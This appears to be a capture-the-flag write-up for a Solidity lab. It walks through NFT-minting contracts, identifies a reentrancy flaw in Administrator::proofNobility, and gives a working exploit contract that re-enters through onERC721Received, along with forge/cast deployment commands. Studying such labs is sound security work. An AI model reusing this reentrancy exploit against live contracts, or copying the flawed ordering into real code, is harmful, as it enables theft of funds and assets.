A Symbol of Noble turns out to be an NFT, what a joke right? But it seems that the deal here is a real one, now let's see what we have to do for achieving this "Noble" status.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Administrator.sol";
import "./Noble.sol";

contract Setup{
    Noble public noble;
    Administrator public admin;

    constructor() {
        noble = new Noble();
        admin = new Administrator(address(noble), 1 ether);
        noble.setAdministrator(address(admin));
    }

    function isSolved() public view returns(bool){
        return admin.trueNoble();
    }
}
```

In the constructor we can see that the `Setup Contract` can call a function `Noble::setAdministrator()`, so it seems that there is a `onlyOwner()` modifier in the `Administrator Contract`. The `isSolved()` condition will be true if the variable in the `Administrator::trueNoble()` has the value of true. Okay, enough information here, let's move to the `Noble Contract` since the `Administrator Contract` also need `Noble` to be deployed first

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ERC721URIStorage, ERC721} from "./ERC721/ERC721URIStorage.sol";

contract Noble is ERC721URIStorage{

    struct NobilityStatus{
        address NoblePeople;
        bool isNoble;
    }

    address public owner;
    address public administrator;
    uint256 public nobilityCounter = 1;
    mapping(address => uint256) public NobilityInPossession;
    mapping(uint256 => NobilityStatus) public NOBLENFT;

    modifier onlyOwner{
        require(msg.sender == owner, "Owner Only Function");
        _;
    }   

    modifier onlyAdministrator{
        require(msg.sender == administrator);
        _;
    }

    constructor() payable ERC721("Nobility", "NOBLE"){
        owner = msg.sender;
    }


    function setAdministrator(address _administrator) public onlyOwner{
        administrator = _administrator;
    }

    function mintNobility(address _to) public onlyAdministrator{
        uint256 newNobleNFT = nobilityCounter++;
        NobilityInPossession[_to] += 1;

        _safeMint(_to, newNobleNFT);
        NOBLENFT[newNobleNFT] = NobilityStatus({
            NoblePeople: _to,
            isNoble: true
        });
    }

    function getProofOfNobility(uint256 _id) public view returns (NobilityStatus memory){
        return NOBLENFT[_id];
    }

    function getNobilityInPossession(address _who) public view returns(uint256){
        return NobilityInPossession[_who];
    }

}
```

Based on what we see from top to bottom, this is the Contract that implements the ERC721 Standard with the name of `Nobility` and symbol `NOBLE`, and just like what we've guessed, it has a `onlyOwner()` modifier, plus it also has `onlyAdministrator`, from this information we know that the `Administrator` is the contract that we will have to interact with since `Noble Contract` is the one implement the standard.

The function `mintNobility()` is only accessible by `Administrator Contract` and will give the NFT to the receiver using `_safeMint()`. The other 2 functions only exist to give back the condition of someone NFT and the NFT one owns. Let's move on to the `Administrator Contract`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Noble.sol";

contract Administrator{

    Noble public noble;

    bool public trueNoble;
    uint256 public fee;
    address public owner;

    mapping(address => bool) public joined;

    constructor(address _noble, uint256 _fee) {
        owner = msg.sender;
        noble = Noble(_noble);
        fee = _fee;
    }

    function proofNobility() public payable{
        require(msg.value == fee, "The Fee, you must pay it!");
        require(joined[msg.sender] == false, "You are one of them already!");
        noble.mintNobility(msg.sender);
        joined[msg.sender] = true;
    }

    function isTrueNoble() public{
        require(joined[msg.sender] == true, "Must be at least Noble!");
        if(noble.getNobilityInPossession(msg.sender) == 10){
            trueNoble = true;
        }
    }

}
```

Starting from the constructor, it seems that 1 Ether that we saw in `Setup::constructor()` was meant to set the `fee()` on `Administrator Contract`. This contract has only 2 function, first is a payable function called `proofNobility()`, by providing 1 Ether, we will received our own NFT because this function will call `Noble::mintNobility()`. The other function, `isTrueNoble()` will modify the `trueNoble()` variable if the `msg.sender` has 10 NFT on its possession, wait... let's look this function closely

```solidity
    function proofNobility() public payable{
        require(msg.value == fee, "The Fee, you must pay it!"); 
        require(joined[msg.sender] == false, "You are one of them already!"); //CHECK
        noble.mintNobility(msg.sender); // INTERACTIONS
        joined[msg.sender] = true; // EFFECT
    }
```

It seems that it doesn't implement the CEI pattern correctly! Instead of changing the status of `joined()` first before minting the NFT, it mints the NFT first to the `msg.sender`, so we have a potential Reentrancy here! The Idea now is calling this `proofNobility()` function 10 times, but there is something that we need to know first

```solidity
// Snippet of ERC721 _safeMint
    function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {
        _mint(to, tokenId);
        ERC721Utils.checkOnERC721Received(_msgSender(), address(0), to, tokenId, data);
    }
```

So on every mint it will check for the receiver, whether the receiver is able to receive ERC721 transfer, the function that responsible for doing this check is called `onERC721Received()` and it's originated from `ERC721Utils`, it will perform a check of magic number (bytes4) and only when the Receiver can return the correct one then the transfer will be completed. This check however only performend on non-EOA, and here is the code

```solidity
library ERC721Utils {
    /**
     * @dev Performs an acceptance check for the provided `operator` by calling {IERC721-onERC721Received}
     * on the `to` address. The `operator` is generally the address that initiated the token transfer (i.e. `msg.sender`).
     *
     * The acceptance call is not executed and treated as a no-op if the target address doesn't contain code (i.e. an EOA).
     * Otherwise, the recipient must implement {IERC721Receiver-onERC721Received} and return the acceptance magic value to accept
     * the transfer.
     */
    function checkOnERC721Received(
        address operator,
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    ) internal {
        if (to.code.length > 0) {
            try IERC721Receiver(to).onERC721Received(operator, from, tokenId, data) returns (bytes4 retval) {
                if (retval != IERC721Receiver.onERC721Received.selector) {
                    // Token rejected
                    revert IERC721Errors.ERC721InvalidReceiver(to);
                }
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    // non-IERC721Receiver implementer
                    revert IERC721Errors.ERC721InvalidReceiver(to);
                } else {
                    assembly ("memory-safe") {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        }
    }
}
```

We know what we have to do now, we just need to implement the Exploit, here is the final Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Administrator.sol";
import "./Noble.sol";
import "./Setup.sol";
import "openzeppelin/token/ERC721/IERC721Receiver.sol";

contract Exploit is IERC721Receiver {
    Setup public setup;
    Noble public noble;
    Administrator public admin;

    uint256 public count = 0;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        noble = Noble(setup.noble());
        admin = Administrator(setup.admin());
    }

    function exploit() public{
        count++;
        admin.proofNobility{value: 1 ether}();
    }

    function proofSolve() public{
        admin.isTrueNoble();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (count != 10){
            count++;
            admin.proofNobility{value: 1 ether}();
        }
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

}
```

I will explain a little bit about the `onERC721Received()`, like what I've said before, it checks if the Receiver is capable to receiving ERC721 Transfer especially if it's a Smart Contract, this function ensure that it can return the correct selector of `onERC721Received(address,address,uint256,bytes)`, that's why as long we return the correct value there we can put a logic before the return making it controlable just like implementing a logic on `receive()` when we are doing Reentrancy. Here is how we can deploy and solve the Contract

```bash
// Checking Our Balance Since we need at least 10 Ether
// We have 12 Ether
cast balance -r $RPC_URL $WALLET_ADDR

// Deploying the Exploit
forge create src/symbol-of-noble/$EXPLOIT_FILE:$EXPLOIT -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR --value 11ether

// Exploiting Administrator
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"

// Calling the isTrueNoble()
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "proofSolve()"
```

Running the command above should've solved the lab!